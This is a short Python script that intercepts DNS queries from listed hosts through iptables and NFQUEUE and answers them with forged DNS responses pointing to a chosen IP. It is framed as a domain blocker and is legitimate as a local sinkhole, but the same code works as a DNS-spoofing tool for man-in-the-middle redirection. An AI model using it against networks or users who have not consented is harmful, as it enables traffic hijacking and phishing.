#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Created: 2017-02-22
# Author: Johnathan
#
# Distributed under terms of the MIT license.
# Requires python-nfqueue 0.4-3

import time
import argparse
import nfqueue
import os
import subprocess as sp
from socket import getfqdn

try:
    from scapy.all import *
except ImportError:
    from scapy import *
try:
    from subprocess import DEVNULL
except ImportError:
    DEVNULL = open(os.devnull, 'wb')

parser = argparse.ArgumentParser()
parser.add_argument('-d', '--domains', dest='domain', action='store', nargs='+', default=None, required=True, type=str,
                    help='CSV list of domains to block.')
parser.add_argument('--hosts', dest='ip_address', action='store', nargs='+', default=None, required=True, type=str,
                    help='CSV list of the IP addresses from hosts to be blacklisted.')
parser.add_argument('-s', '--spoof', dest='redirect_ip', action='store', default='192.168.2.98', required=False,
                    type=str, help='The response IP address of the spoofed packets.')
args = parser.parse_args()

iptables_table = 'dns_reject'
iptables_bin = '/sbin/iptables'


def clean_iptables(table_name):
    try:
        sp.check_call([iptables_bin, '-L', table_name], stdout=DEVNULL, stderr=DEVNULL)
        sp.Popen([iptables_bin, '-D', 'INPUT', '-j', table_name], stdout=DEVNULL, stderr=DEVNULL)
        sp.Popen([iptables_bin, '-F', table_name], stdout=DEVNULL, stderr=DEVNULL)
        sp.Popen([iptables_bin, '-X', table_name], stdout=DEVNULL, stderr=DEVNULL)
    except sp.CalledProcessError as err:
        pass


def create_iptables(table_name, ips):
    sp.Popen([iptables_bin, '-N', table_name], stdout=DEVNULL, stderr=DEVNULL)
    sp.Popen([iptables_bin, '-A', 'INPUT', '-j', table_name], stdout=DEVNULL, stderr=DEVNULL)
    sp.Popen([iptables_bin, '-A', table_name, '-s', ','.join(ips), '-p', 'udp', '--dport', '53', '-j', 'NFQUEUE'],
             stdout=DEVNULL, stderr=DEVNULL)


def callback(payload):
    data = payload.get_data()
    pkt = IP(data)
    if not pkt.haslayer(DNSQR):
        payload.set_verdict(nfqueue.NF_ACCEPT)
    else:
        for d in args.domain:
            if d in pkt[DNS].qd.qname or d == '*':
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=args.redirect_ip))
                payload.set_verdict(nfqueue.NF_DROP)
                send(spoofed_pkt, verbose=0)
                print "{} *SPOOFED* {:<30} -> {}".format(time.strftime("%Y-%m-%d %H:%M"), pkt[DNS].qd.qname[:28],
                                                         getfqdn(pkt[IP].src))
                return
        print "{} {:<40} -> {}".format(time.strftime("%Y-%m-%d %H:%M"), pkt[DNS].qd.qname[:38], getfqdn(pkt[IP].src))


def main():
    if os.getgid():
        print("NFQUEUE requires root permissions.")
        sys.exit(1)
    clean_iptables(iptables_table)
    create_iptables(iptables_table, args.ip_address)
    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(callback)
    q.create_queue(0)
    try:
        q.try_run()  # Main loop
    except KeyboardInterrupt:
        q.unbind(socket.AF_INET)
        q.close()
        clean_iptables(iptables_table)
        sys.exit('Closing...')


if __name__ == '__main__':
    main()
